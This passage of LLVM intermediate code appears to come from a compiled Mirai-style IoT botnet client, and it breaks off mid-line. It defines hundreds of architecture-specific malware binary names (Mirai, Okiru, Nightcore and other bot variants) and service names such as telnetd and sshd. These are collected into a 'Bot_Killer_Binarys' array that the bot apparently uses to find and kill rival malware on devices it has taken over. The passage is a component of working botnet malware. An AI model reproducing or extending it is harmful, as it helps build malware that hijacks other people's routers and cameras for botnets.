@.str.176 = private unnamed_addr constant [11 x i8] c"jackmymips\00", align 1
@.str.177 = private unnamed_addr constant [13 x i8] c"jackmymips64\00", align 1
@.str.178 = private unnamed_addr constant [13 x i8] c"jackmymipsel\00", align 1
@.str.179 = private unnamed_addr constant [12 x i8] c"jackmysh2eb\00", align 1
@.str.180 = private unnamed_addr constant [13 x i8] c"jackmysh2elf\00", align 1
@.str.181 = private unnamed_addr constant [10 x i8] c"jackmysh4\00", align 1
@.str.182 = private unnamed_addr constant [10 x i8] c"jackmyx86\00", align 1
@.str.183 = private unnamed_addr constant [12 x i8] c"jackmyarmv5\00", align 1
@.str.184 = private unnamed_addr constant [14 x i8] c"jackmyarmv4tl\00", align 1
@.str.185 = private unnamed_addr constant [12 x i8] c"jackmyarmv4\00", align 1
@.str.186 = private unnamed_addr constant [12 x i8] c"jackmyarmv6\00", align 1
@.str.187 = private unnamed_addr constant [11 x i8] c"jackmyi686\00", align 1
@.str.188 = private unnamed_addr constant [14 x i8] c"jackmypowerpc\00", align 1
@.str.189 = private unnamed_addr constant [19 x i8] c"jackmypowerpc440fp\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"jackmyi586\00", align 1
@.str.191 = private unnamed_addr constant [11 x i8] c"jackmym68k\00", align 1
@.str.192 = private unnamed_addr constant [12 x i8] c"jackmysparc\00", align 1
@.str.193 = private unnamed_addr constant [13 x i8] c"jackmyx86_64\00", align 1
@.str.194 = private unnamed_addr constant [11 x i8] c"hackmymips\00", align 1
@.str.195 = private unnamed_addr constant [13 x i8] c"hackmymips64\00", align 1
@.str.196 = private unnamed_addr constant [13 x i8] c"hackmymipsel\00", align 1
@.str.197 = private unnamed_addr constant [12 x i8] c"hackmysh2eb\00", align 1
@.str.198 = private unnamed_addr constant [13 x i8] c"hackmysh2elf\00", align 1
@.str.199 = private unnamed_addr constant [10 x i8] c"hackmysh4\00", align 1
@.str.200 = private unnamed_addr constant [10 x i8] c"hackmyx86\00", align 1
@.str.201 = private unnamed_addr constant [12 x i8] c"hackmyarmv5\00", align 1
@.str.202 = private unnamed_addr constant [14 x i8] c"hackmyarmv4tl\00", align 1
@.str.203 = private unnamed_addr constant [12 x i8] c"hackmyarmv4\00", align 1
@.str.204 = private unnamed_addr constant [12 x i8] c"hackmyarmv6\00", align 1
@.str.205 = private unnamed_addr constant [11 x i8] c"hackmyi686\00", align 1
@.str.206 = private unnamed_addr constant [14 x i8] c"hackmypowerpc\00", align 1
@.str.207 = private unnamed_addr constant [19 x i8] c"hackmypowerpc440fp\00", align 1
@.str.208 = private unnamed_addr constant [11 x i8] c"hackmyi586\00", align 1
@.str.209 = private unnamed_addr constant [11 x i8] c"hackmym68k\00", align 1
@.str.210 = private unnamed_addr constant [12 x i8] c"hackmysparc\00", align 1
@.str.211 = private unnamed_addr constant [13 x i8] c"hackmyx86_64\00", align 1
@.str.212 = private unnamed_addr constant [4 x i8] c"b10\00", align 1
@.str.213 = private unnamed_addr constant [4 x i8] c"b11\00", align 1
@.str.214 = private unnamed_addr constant [4 x i8] c"b12\00", align 1
@.str.215 = private unnamed_addr constant [4 x i8] c"b13\00", align 1
@.str.216 = private unnamed_addr constant [4 x i8] c"b14\00", align 1
@.str.217 = private unnamed_addr constant [4 x i8] c"b15\00", align 1
@.str.218 = private unnamed_addr constant [4 x i8] c"b16\00", align 1
@.str.219 = private unnamed_addr constant [4 x i8] c"b17\00", align 1
@.str.220 = private unnamed_addr constant [4 x i8] c"b18\00", align 1
@.str.221 = private unnamed_addr constant [4 x i8] c"b19\00", align 1
@.str.222 = private unnamed_addr constant [4 x i8] c"b20\00", align 1
@.str.223 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.224 = private unnamed_addr constant [8 x i8] c"kmymips\00", align 1
@.str.225 = private unnamed_addr constant [10 x i8] c"kmymips64\00", align 1
@.str.226 = private unnamed_addr constant [10 x i8] c"kmymipsel\00", align 1
@.str.227 = private unnamed_addr constant [9 x i8] c"kmysh2eb\00", align 1
@.str.228 = private unnamed_addr constant [10 x i8] c"kmysh2elf\00", align 1
@.str.229 = private unnamed_addr constant [7 x i8] c"kmysh4\00", align 1
@.str.230 = private unnamed_addr constant [7 x i8] c"kmyx86\00", align 1
@.str.231 = private unnamed_addr constant [9 x i8] c"kmyarmv5\00", align 1
@.str.232 = private unnamed_addr constant [11 x i8] c"kmyarmv4tl\00", align 1
@.str.233 = private unnamed_addr constant [9 x i8] c"kmyarmv4\00", align 1
@.str.234 = private unnamed_addr constant [9 x i8] c"kmyarmv6\00", align 1
@.str.235 = private unnamed_addr constant [11 x i8] c"botkillme*\00", align 1
@.str.236 = private unnamed_addr constant [8 x i8] c"kmyi686\00", align 1
@.str.237 = private unnamed_addr constant [11 x i8] c"kmypowerpc\00", align 1
@.str.238 = private unnamed_addr constant [16 x i8] c"kmypowerpc440fp\00", align 1
@.str.239 = private unnamed_addr constant [8 x i8] c"kmyi586\00", align 1
@.str.240 = private unnamed_addr constant [8 x i8] c"kmym68k\00", align 1
@.str.241 = private unnamed_addr constant [9 x i8] c"kmysparc\00", align 1
@.str.242 = private unnamed_addr constant [8 x i8] c"lolmips\00", align 1
@.str.243 = private unnamed_addr constant [10 x i8] c"lolmips64\00", align 1
@.str.244 = private unnamed_addr constant [9 x i8] c"lolsh2eb\00", align 1
@.str.245 = private unnamed_addr constant [10 x i8] c"lolsh2elf\00", align 1
@.str.246 = private unnamed_addr constant [7 x i8] c"lolsh4\00", align 1
@.str.247 = private unnamed_addr constant [7 x i8] c"lolx86\00", align 1
@.str.248 = private unnamed_addr constant [9 x i8] c"lolarmv5\00", align 1
@.str.249 = private unnamed_addr constant [11 x i8] c"lolarmv4tl\00", align 1
@.str.250 = private unnamed_addr constant [9 x i8] c"lolarmv4\00", align 1
@.str.251 = private unnamed_addr constant [9 x i8] c"lolarmv6\00", align 1
@.str.252 = private unnamed_addr constant [8 x i8] c"loli686\00", align 1
@.str.253 = private unnamed_addr constant [12 x i8] c"mirai.linux\00", align 1
@.str.254 = private unnamed_addr constant [11 x i8] c"mirai.mips\00", align 1
@.str.255 = private unnamed_addr constant [11 x i8] c"lolpowerpc\00", align 1
@.str.256 = private unnamed_addr constant [16 x i8] c"lolpowerpc440fp\00", align 1
@.str.257 = private unnamed_addr constant [8 x i8] c"loli586\00", align 1
@.str.258 = private unnamed_addr constant [8 x i8] c"lolm68k\00", align 1
@.str.259 = private unnamed_addr constant [9 x i8] c"lolsparc\00", align 1
@.str.260 = private unnamed_addr constant [8 x i8] c"telmips\00", align 1
@.str.261 = private unnamed_addr constant [10 x i8] c"telmips64\00", align 1
@.str.262 = private unnamed_addr constant [10 x i8] c"telmipsel\00", align 1
@.str.263 = private unnamed_addr constant [9 x i8] c"telsh2eb\00", align 1
@.str.264 = private unnamed_addr constant [10 x i8] c"telsh2elf\00", align 1
@.str.265 = private unnamed_addr constant [7 x i8] c"telsh4\00", align 1
@.str.266 = private unnamed_addr constant [7 x i8] c"telx86\00", align 1
@.str.267 = private unnamed_addr constant [9 x i8] c"telarmv5\00", align 1
@.str.268 = private unnamed_addr constant [11 x i8] c"telarmv4tl\00", align 1
@.str.269 = private unnamed_addr constant [9 x i8] c"telarmv4\00", align 1
@.str.270 = private unnamed_addr constant [9 x i8] c"telarmv6\00", align 1
@.str.271 = private unnamed_addr constant [8 x i8] c"teli686\00", align 1
@.str.272 = private unnamed_addr constant [11 x i8] c"telpowerpc\00", align 1
@.str.273 = private unnamed_addr constant [16 x i8] c"telpowerpc440fp\00", align 1
@.str.274 = private unnamed_addr constant [8 x i8] c"teli586\00", align 1
@.str.275 = private unnamed_addr constant [8 x i8] c"telm68k\00", align 1
@.str.276 = private unnamed_addr constant [9 x i8] c"telsparc\00", align 1
@.str.277 = private unnamed_addr constant [10 x i8] c"telx86_64\00", align 1
@.str.278 = private unnamed_addr constant [12 x i8] c"TwoFacemips\00", align 1
@.str.279 = private unnamed_addr constant [14 x i8] c"TwoFacemips64\00", align 1
@.str.280 = private unnamed_addr constant [14 x i8] c"TwoFacemipsel\00", align 1
@.str.281 = private unnamed_addr constant [13 x i8] c"TwoFacesh2eb\00", align 1
@.str.282 = private unnamed_addr constant [14 x i8] c"TwoFacesh2elf\00", align 1
@.str.283 = private unnamed_addr constant [11 x i8] c"TwoFacesh4\00", align 1
@.str.284 = private unnamed_addr constant [11 x i8] c"TwoFacex86\00", align 1
@.str.285 = private unnamed_addr constant [13 x i8] c"TwoFacearmv5\00", align 1
@.str.286 = private unnamed_addr constant [15 x i8] c"TwoFacearmv4tl\00", align 1
@.str.287 = private unnamed_addr constant [13 x i8] c"TwoFacearmv4\00", align 1
@.str.288 = private unnamed_addr constant [13 x i8] c"TwoFacearmv6\00", align 1
@.str.289 = private unnamed_addr constant [12 x i8] c"TwoFacei686\00", align 1
@.str.290 = private unnamed_addr constant [15 x i8] c"TwoFacepowerpc\00", align 1
@.str.291 = private unnamed_addr constant [20 x i8] c"TwoFacepowerpc440fp\00", align 1
@.str.292 = private unnamed_addr constant [12 x i8] c"TwoFacei586\00", align 1
@.str.293 = private unnamed_addr constant [12 x i8] c"TwoFacem68k\00", align 1
@.str.294 = private unnamed_addr constant [13 x i8] c"TwoFacesparc\00", align 1
@.str.295 = private unnamed_addr constant [14 x i8] c"TwoFacex86_64\00", align 1
@.str.296 = private unnamed_addr constant [5 x i8] c"xxb1\00", align 1
@.str.297 = private unnamed_addr constant [5 x i8] c"xxb2\00", align 1
@.str.298 = private unnamed_addr constant [5 x i8] c"xxb3\00", align 1
@.str.299 = private unnamed_addr constant [5 x i8] c"xxb4\00", align 1
@.str.300 = private unnamed_addr constant [5 x i8] c"xxb5\00", align 1
@.str.301 = private unnamed_addr constant [5 x i8] c"xxb6\00", align 1
@.str.302 = private unnamed_addr constant [5 x i8] c"xxb7\00", align 1
@.str.303 = private unnamed_addr constant [5 x i8] c"xxb8\00", align 1
@.str.304 = private unnamed_addr constant [5 x i8] c"xxb9\00", align 1
@.str.305 = private unnamed_addr constant [6 x i8] c"xxb10\00", align 1
@.str.306 = private unnamed_addr constant [6 x i8] c"xxb11\00", align 1
@.str.307 = private unnamed_addr constant [6 x i8] c"xxb12\00", align 1
@.str.308 = private unnamed_addr constant [6 x i8] c"xxb13\00", align 1
@.str.309 = private unnamed_addr constant [6 x i8] c"xxb14\00", align 1
@.str.310 = private unnamed_addr constant [6 x i8] c"xxb15\00", align 1
@.str.311 = private unnamed_addr constant [6 x i8] c"xxb16\00", align 1
@.str.312 = private unnamed_addr constant [6 x i8] c"xxb17\00", align 1
@.str.313 = private unnamed_addr constant [6 x i8] c"xxb18\00", align 1
@.str.314 = private unnamed_addr constant [6 x i8] c"xxb19\00", align 1
@.str.315 = private unnamed_addr constant [6 x i8] c"xxb20\00", align 1
@.str.316 = private unnamed_addr constant [3 x i8] c"bb\00", align 1
@.str.317 = private unnamed_addr constant [11 x i8] c"busybotnet\00", align 1
@.str.318 = private unnamed_addr constant [5 x i8] c"pppd\00", align 1
@.str.319 = private unnamed_addr constant [6 x i8] c"pppoe\00", align 1
@.str.320 = private unnamed_addr constant [5 x i8] c"wput\00", align 1
@.str.321 = private unnamed_addr constant [4 x i8] c"DVR\00", align 1
@.str.322 = private unnamed_addr constant [7 x i8] c"*mirai\00", align 1
@.str.323 = private unnamed_addr constant [8 x i8] c"*.mirai\00", align 1
@.str.324 = private unnamed_addr constant [7 x i8] c"cunty*\00", align 1
@.str.325 = private unnamed_addr constant [3 x i8] c"pc\00", align 1
@.str.326 = private unnamed_addr constant [11 x i8] c"orion.mips\00", align 1
@.str.327 = private unnamed_addr constant [11 x i8] c"okiru.mips\00", align 1
@.str.328 = private unnamed_addr constant [15 x i8] c"nightcore.mips\00", align 1
@.str.329 = private unnamed_addr constant [3 x i8] c"ar\00", align 1
@.str.330 = private unnamed_addr constant [9 x i8] c"lsp.modz\00", align 1
@.str.331 = private unnamed_addr constant [11 x i8] c"nightcore*\00", align 1
@.str.332 = private unnamed_addr constant [6 x i8] c"netis\00", align 1
@.str.333 = private unnamed_addr constant [7 x i8] c"mipsxd\00", align 1
@.str.334 = private unnamed_addr constant [9 x i8] c"die.mips\00", align 1
@.str.335 = private unnamed_addr constant [13 x i8] c"dupessh*mips\00", align 1
@.str.336 = private unnamed_addr constant [7 x i8] c"linux*\00", align 1
@.str.337 = private unnamed_addr constant [7 x i8] c"mirai*\00", align 1
@.str.338 = private unnamed_addr constant [7 x i8] c"*.mips\00", align 1
@.str.339 = private unnamed_addr constant [4 x i8] c"pps\00", align 1
@.str.340 = private unnamed_addr constant [5 x i8] c"sh4*\00", align 1
@.str.341 = private unnamed_addr constant [6 x i8] c"wget*\00", align 1
@.str.342 = private unnamed_addr constant [5 x i8] c"ssh*\00", align 1
@.str.343 = private unnamed_addr constant [7 x i8] c"vulcan\00", align 1
@.str.344 = private unnamed_addr constant [10 x i8] c"jennifer*\00", align 1
@.str.345 = private unnamed_addr constant [7 x i8] c"okiru*\00", align 1
@.str.346 = private unnamed_addr constant [8 x i8] c"vulcana\00", align 1
@.str.347 = private unnamed_addr constant [8 x i8] c"vulcanb\00", align 1
@.str.348 = private unnamed_addr constant [8 x i8] c"vulcand\00", align 1
@.str.349 = private unnamed_addr constant [8 x i8] c"vulcane\00", align 1
@.str.350 = private unnamed_addr constant [8 x i8] c"vulcanx\00", align 1
@.str.351 = private unnamed_addr constant [8 x i8] c"vulcany\00", align 1
@.str.352 = private unnamed_addr constant [8 x i8] c"vulcanz\00", align 1
@.str.353 = private unnamed_addr constant [8 x i8] c"vulcang\00", align 1
@.str.354 = private unnamed_addr constant [8 x i8] c"vulcan*\00", align 1
@.str.355 = private unnamed_addr constant [8 x i8] c"apache2\00", align 1
@.str.356 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.357 = private unnamed_addr constant [7 x i8] c"gaybot\00", align 1
@.str.358 = private unnamed_addr constant [8 x i8] c"qghiqgd\00", align 1
@.str.359 = private unnamed_addr constant [8 x i8] c"cdnnqkk\00", align 1
@.str.360 = private unnamed_addr constant [8 x i8] c"uhnvepy\00", align 1
@.str.361 = private unnamed_addr constant [8 x i8] c"zrzyqyc\00", align 1
@.str.362 = private unnamed_addr constant [8 x i8] c"zvkghct\00", align 1
@.str.363 = private unnamed_addr constant [8 x i8] c"mykzydo\00", align 1
@.str.364 = private unnamed_addr constant [8 x i8] c"yyfizcz\00", align 1
@.str.365 = private unnamed_addr constant [8 x i8] c"zjevbar\00", align 1
@.str.366 = private unnamed_addr constant [8 x i8] c"lowssdj\00", align 1
@.str.367 = private unnamed_addr constant [8 x i8] c"aexpcjr\00", align 1
@.str.368 = private unnamed_addr constant [8 x i8] c"qssyevb\00", align 1
@.str.369 = private unnamed_addr constant [8 x i8] c"gcjiyol\00", align 1
@.str.370 = private unnamed_addr constant [8 x i8] c"inlxqjm\00", align 1
@.str.371 = private unnamed_addr constant [8 x i8] c"swgypcx\00", align 1
@.str.372 = private unnamed_addr constant [8 x i8] c"whsilop\00", align 1
@.str.373 = private unnamed_addr constant [8 x i8] c"ezmjymp\00", align 1
@.str.374 = private unnamed_addr constant [8 x i8] c"huscmww\00", align 1
@.str.375 = private unnamed_addr constant [8 x i8] c"pbhcocg\00", align 1
@.str.376 = private unnamed_addr constant [4 x i8] c"unk\00", align 1
@.str.377 = private unnamed_addr constant [5 x i8] c"unk*\00", align 1
@.str.378 = private unnamed_addr constant [5 x i8] c"unk1\00", align 1
@.str.379 = private unnamed_addr constant [5 x i8] c"unk2\00", align 1
@.str.380 = private unnamed_addr constant [5 x i8] c"unk3\00", align 1
@.str.381 = private unnamed_addr constant [5 x i8] c"unk4\00", align 1
@.str.382 = private unnamed_addr constant [7 x i8] c"smbvar\00", align 1
@.str.383 = private unnamed_addr constant [5 x i8] c"cert\00", align 1
@.str.384 = private unnamed_addr constant [10 x i8] c"neoisgay1\00", align 1
@.str.385 = private unnamed_addr constant [6 x i8] c"migg*\00", align 1
@.str.386 = private unnamed_addr constant [6 x i8] c"*ntpd\00", align 1
@.str.387 = private unnamed_addr constant [6 x i8] c"*sshd\00", align 1
@.str.388 = private unnamed_addr constant [10 x i8] c"miggsntpd\00", align 1
@.str.389 = private unnamed_addr constant [10 x i8] c"miggssshd\00", align 1
@.str.390 = private unnamed_addr constant [8 x i8] c"glbkjrn\00", align 1
@.str.391 = private unnamed_addr constant [8 x i8] c"vlbebuw\00", align 1
@.str.392 = private unnamed_addr constant [8 x i8] c"vqvdszx\00", align 1
@.str.393 = private unnamed_addr constant [8 x i8] c"ybahlvc\00", align 1
@.str.394 = private unnamed_addr constant [8 x i8] c"ttyuceq\00", align 1
@.str.395 = private unnamed_addr constant [8 x i8] c"keansia\00", align 1
@.str.396 = private unnamed_addr constant [8 x i8] c"scplnrh\00", align 1
@.str.397 = private unnamed_addr constant [8 x i8] c"eyqpmcb\00", align 1
@.str.398 = private unnamed_addr constant [8 x i8] c"thwbaja\00", align 1
@.str.399 = private unnamed_addr constant [8 x i8] c"ugenuge\00", align 1
@.str.400 = private unnamed_addr constant [8 x i8] c"pfdbupp\00", align 1
@.str.401 = private unnamed_addr constant [8 x i8] c"djnkpip\00", align 1
@.str.402 = private unnamed_addr constant [8 x i8] c"xvurmuo\00", align 1
@.str.403 = private unnamed_addr constant [8 x i8] c"xzywnsq\00", align 1
@.str.404 = private unnamed_addr constant [8 x i8] c"lztuvaq\00", align 1
@.str.405 = private unnamed_addr constant [8 x i8] c"pducsnb\00", align 1
@.str.406 = private unnamed_addr constant [8 x i8] c"adgjedp\00", align 1
@.str.407 = private unnamed_addr constant [8 x i8] c"khnklhx\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"svjqtj\00", align 1
@.str.409 = private unnamed_addr constant [7 x i8] c"yolwdx\00", align 1
@.str.410 = private unnamed_addr constant [7 x i8] c"aveckh\00", align 1
@.str.411 = private unnamed_addr constant [7 x i8] c"mltnkv\00", align 1
@.str.412 = private unnamed_addr constant [7 x i8] c"sawvqb\00", align 1
@.str.413 = private unnamed_addr constant [7 x i8] c"xxwkvy\00", align 1
@.str.414 = private unnamed_addr constant [7 x i8] c"hcgguc\00", align 1
@.str.415 = private unnamed_addr constant [7 x i8] c"tlrgju\00", align 1
@.str.416 = private unnamed_addr constant [7 x i8] c"yfdieg\00", align 1
@.str.417 = private unnamed_addr constant [7 x i8] c"kuvikr\00", align 1
@.str.418 = private unnamed_addr constant [7 x i8] c"kgymka\00", align 1
@.str.419 = private unnamed_addr constant [7 x i8] c"bxdusa\00", align 1
@.str.420 = private unnamed_addr constant [7 x i8] c"kmijih\00", align 1
@.str.421 = private unnamed_addr constant [7 x i8] c"cmnupe\00", align 1
@.str.422 = private unnamed_addr constant [7 x i8] c"jkuruo\00", align 1
@.str.423 = private unnamed_addr constant [7 x i8] c"hnqdok\00", align 1
@.str.424 = private unnamed_addr constant [7 x i8] c"vxemfi\00", align 1
@.str.425 = private unnamed_addr constant [7 x i8] c"xzdlvy\00", align 1
@Bot_Killer_Binarys = dso_local global [355 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds 